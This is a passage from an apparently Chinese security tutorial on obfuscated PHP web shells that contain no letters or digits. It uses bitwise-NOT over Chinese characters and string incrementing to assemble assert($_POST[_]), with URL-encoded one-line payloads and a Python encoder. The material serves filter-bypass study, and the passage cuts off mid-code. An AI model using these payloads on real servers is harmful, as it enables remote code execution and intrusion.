class="string">乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟</span></span><br><span class="line"><span class="string">没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖</span></span><br><span class="line"><span class="string">拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚</span></span><br><span class="line"><span class="string">旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿</span></span><br><span class="line"><span class="string">胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试</span></span><br><span class="line"><span class="string">郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪</span></span><br><span class="line"><span class="string">某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂</span></span><br><span class="line"><span class="string">哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀</span></span><br><span class="line"><span class="string">饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误</span></span><br><span class="line"><span class="string">诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫</span></span><br><span class="line"><span class="string">荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积</span></span><br><span class="line"><span class="string">秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳</span></span><br><span class="line"><span class="string">粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继</span></span><br><span class="line"><span class="string">球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇</span></span><br><span class="line"><span class="string">圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐</span></span><br><span class="line"><span class="string">混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬</span></span><br><span class="line"><span class="string">葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩</span></span><br><span class="line"><span class="string">稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙</span></span><br><span class="line"><span class="string">谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳</span></span><br><span class="line"><span class="string">跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静</span></span><br><span class="line"><span class="string">碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱</span></span><br><span class="line"><span class="string">嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐</span></span><br><span class="line"><span class="string">嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾</span></span><br><span class="line"><span class="string">夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛</span></span><br><span class="line"><span class="string">吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙</span></span><br><span class="line"><span class="string">呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤</span></span><br><span class="line"><span class="string">荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦</span></span><br><span class="line"><span class="string">匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋</span></span><br><span class="line"><span class="string">疹紊瓷羔烙浦涡涣涤涧涕涩悍悯窍诺诽袒谆祟恕娩骏琐麸琉琅措捺捶赦埠捻掐掂掖掷掸掺勘聊娶菱菲萎菩萤乾萧萨菇彬梗梧梭曹酝酗厢硅硕奢盔匾颅彪眶晤曼晦冕啡畦趾啃蛆蚯蛉蛀唬唾</span></span><br><span class="line"><span class="string">啤啥啸崎逻崔崩婴赊铐铛铝铡铣铭矫秸秽笙笤偎傀躯兜衅徘徙舶舷舵敛翎脯逸凰猖祭烹庶庵痊阎阐眷焊焕鸿涯淑淌淮淆渊淫淳淤淀涮涵惦悴惋寂窒谍谐裆袱祷谒谓谚尉堕隅婉颇绰绷综绽</span></span><br><span class="line"><span class="string">缀巢琳琢琼揍堰揩揽揖彭揣搀搓壹搔葫募蒋蒂韩棱椰焚椎棺榔椭粟棘酣酥硝硫颊雳翘凿棠晰鼎喳遏晾畴跋跛蛔蜒蛤鹃喻啼喧嵌赋赎赐锉锌甥掰氮氯黍筏牍粤逾腌腋腕猩猬惫敦痘痢痪竣翔</span></span><br><span class="line"><span class="string">奠遂焙滞湘渤渺溃溅湃愕惶寓窖窘雇谤犀隘媒媚婿缅缆缔缕骚瑟鹉瑰搪聘斟靴靶蓖蒿蒲蓉楔椿楷榄楞楣酪碘硼碉辐辑频睹睦瞄嗜嗦暇畸跷跺蜈蜗蜕蛹嗅嗡嗤署蜀幌锚锥锨锭锰稚颓筷魁衙</span></span><br><span class="line"><span class="string">腻腮腺鹏肄猿颖煞雏馍馏禀痹廓痴靖誊漓溢溯溶滓溺寞窥窟寝褂裸谬媳嫉缚缤剿赘熬赫蔫摹蔓蔗蔼熙蔚兢榛榕酵碟碴碱碳辕辖雌墅嘁踊蝉嘀幔镀舔熏箍箕箫舆僧孵瘩瘟彰粹漱漩漾慷寡寥</span></span><br><span class="line"><span class="string">谭褐褪隧嫡缨撵撩撮撬擒墩撰鞍蕊蕴樊樟橄敷豌醇磕磅碾憋嘶嘲嘹蝠蝎蝌蝗蝙嘿幢镊镐稽篓膘鲤鲫褒瘪瘤瘫凛澎潭潦澳潘澈澜澄憔懊憎翩褥谴鹤憨履嬉豫缭撼擂擅蕾薛薇擎翰噩橱橙瓢蟥</span></span><br><span class="line"><span class="string">霍霎辙冀踱蹂蟆螃螟噪鹦黔穆篡篷篙篱儒膳鲸瘾瘸糙燎濒憾懈窿缰壕藐檬檐檩檀礁磷了瞬瞳瞪曙蹋蟋蟀嚎赡镣魏簇儡徽爵朦臊鳄糜癌懦豁臀藕藤瞻嚣鳍癞瀑襟璧戳攒孽蘑藻鳖蹭蹬簸簿蟹</span></span><br><span class="line"><span class="string">靡癣羹鬓攘蠕巍鳞糯譬霹躏髓蘸镶瓤矗&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mb_str_split</span>(<span class="params"> <span class="variable">$string</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_split</span>(<span class="string">&#x27;/(?&lt;!^)(?!$)/u&#x27;</span>, <span class="variable">$string</span> ); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="title function_ invoke__">mb_str_split</span>(<span class="variable">$word</span>) <span class="keyword">as</span> <span class="variable">$c</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$arr</span>[] = <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$y</span>=<span class="number">0</span>;<span class="variable">$y</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$y</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = <span class="variable">$arr</span>[<span class="variable">$y</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$shell</span>[<span class="variable">$x</span>] == ~(<span class="variable">$k</span>&#123;<span class="number">1</span>&#125;))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$k</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure>

<p>构造如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>++;                <span class="comment">//得到1，此时$_=1</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;极&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> = ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到a，此时$___=&quot;a&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;区&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到s，此时$___=&quot;as&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//此时$___=&quot;ass&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;皮&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到e，此时$___=&quot;asse&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;十&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到r，此时$___=&quot;asser&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;勺&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到t，此时$___=&quot;assert&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&#x27;_&#x27;</span>;          <span class="comment">//$____=&#x27;_&#x27;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;寸&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到P，此时$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;小&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到O，此时$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;欠&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到S，此时$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;立&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到T，此时$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;           <span class="comment">//$_ = $_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);           <span class="comment">//assert($_POST[_])</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$__</span> = <span class="string">&quot;极&quot;</span>;<span class="variable">$___</span> = ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;区&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;皮&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;十&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;勺&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$____</span> = <span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span> = <span class="string">&quot;寸&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;小&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;欠&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;立&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$_</span> = <span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line"><span class="comment">//由于不可见字符的原因，我们还是要进行url编码之后才能正常使用：</span></span><br><span class="line">%<span class="number">24</span>_%<span class="number">2</span>B%<span class="number">2</span>B%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E6%<span class="number">9</span>E%<span class="number">81</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E5%<span class="number">8</span>C%BA%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E7%<span class="number">9</span>A%AE%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E5%<span class="number">8</span>D%<span class="number">81</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E5%<span class="number">8</span>B%BA%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>___%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span><span class="string">&#x27;_&#x27;</span>%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E5%AF%B8%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E5%B0%<span class="number">8</span>F%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E6%AC%A0%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>__%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">22</span>%E7%AB%<span class="number">8</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">24</span>____%<span class="number">20</span>.%<span class="number">3</span>D%<span class="number">20</span>~(%<span class="number">24</span>__%<span class="number">7</span>B%<span class="number">24</span>_%<span class="number">7</span>D)%<span class="number">3</span>B%<span class="number">24</span>_%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>%<span class="number">24</span>%<span class="number">24</span>____%<span class="number">3</span>B%<span class="number">24</span>___(%<span class="number">24</span>_%<span class="number">5</span>B_%<span class="number">5</span>D)%<span class="number">3</span>B    </span><br></pre></td></tr></table></figure>

<p>升级版：</p>
<p>在上面的学习过程中，可以知道:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_=&quot;卢&quot;;</span><br><span class="line">print(~($_&#123;1&#125;));</span><br><span class="line">print(~&quot;\x8d&quot;);</span><br></pre></td></tr></table></figure>

<p>这两种写法其实是等价的。所以如果把EXP中的<code>~(&quot;欠&quot;&#123;1&#125;)</code>写成<code>~&quot;\x8d&quot;</code>这种形式，可以缩减不少字符。给出脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">shell</span>):</span><br><span class="line">    hexbit=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">hex</span>(~(-(<span class="number">256</span>-<span class="built_in">ord</span>(x)))),shell))</span><br><span class="line">    hexbit = hexbit.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(hexbit)</span><br><span class="line"></span><br><span class="line">get(<span class="string">&#x27;assert&#x27;</span>)</span><br><span class="line">get(<span class="string">&#x27;_POST&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>利用这个POC，我把上面的EXP缩减为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span> = ~<span class="string">&quot;%9e%8c%8c%9a%8d%8b&quot;</span>;   <span class="comment">//得到assert，此时$_=&quot;assert&quot;</span></span><br><span class="line"><span class="variable">$__</span> = ~<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>;   <span class="comment">//得到_POST，此时$__=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$$__</span>;   <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);   <span class="comment">//assert($_POST[_])</span></span><br><span class="line"><span class="comment">//放到一排就是</span></span><br><span class="line"><span class="variable">$_</span> = ~<span class="string">&quot;%9e%8c%8c%9a%8d%8b&quot;</span>;<span class="variable">$__</span> = ~<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>;<span class="variable">$___</span> = <span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure>

<p>注意到这里<code>assert</code>和<code>_POST</code>都用的URL编码表示，如果直接以<code>\x9e\x8c\x8c\x9a\x8d\x8b</code>这种UTF-8字符表示，并不能识别出为UTF-8字符，而是会被识别为<code>英文+数字</code>的字符串。</p>
<h3 id="自增"><a href="#自增" class="headerlink" title="++自增"></a><code>++</code>自增</h3><p>在处理字符变量的算数运算时，<code>PHP</code>沿袭了<code>Perl</code>的习惯，而不是C语言的。在C语言中，它递增的是<code>ASCII值,a = &#39;Z&#39;; a++;</code> 将把 <code>a</code> 变成 <code>&#39;[&#39;</code>（<code>&#39;Z&#39;</code> 的 ASCII 值是 90，<code>&#39;[&#39;</code> 的 ASCII 值是 91），而在Perl中， <code>$a = &#39;Z&#39;; $a++;</code> 将把 <code>$a</code> 变成<code>&#39;AA&#39;</code>。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增或递减其他字符变量则无效，原字符串没有变化。</p>
<p>也就是说，只要我们获得了小写字母<code>a</code>，就可以通过自增获得所有小写字母，当我们获得大写字母<code>A</code>，就可以获得所有大写字母了</p>
<p>正好，数组(Array)中就正好有大写字母<code>A</code>和小写字母<code>a</code>，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为<code>Array</code>，那取它的第一个子母，就拿到<code>A</code>了，那有了<code>a</code>和<code>A</code>，相当于我们就可以拿到<code>a-z</code>和<code>A-Z</code>中的所有字母了</p>
<p><img src="https://s2.loli.net/2023/11/18/32DfL9smSGYbqzE.png" alt="image.png"></p>
<p>故有payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;   <span class="comment">//得到&quot;Array&quot;</span></span><br><span class="line"><span class="variable">$___</span> = <span class="variable">$_</span>[<span class="variable">$__</span>];   <span class="comment">//得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$___</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$___</span>;   <span class="comment">//$_=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;AS&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="variable">$_</span>;   <span class="comment">//$__=&quot;A&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;E&quot;，此时$__=&quot;E&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSE&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>;<span class="variable">$__</span>++;   <span class="comment">//得到&quot;R&quot;，此时$__=&quot;R&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= <span class="variable">$__</span>;   <span class="comment">//$___=&quot;ASSER&quot;</span></span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;   <span 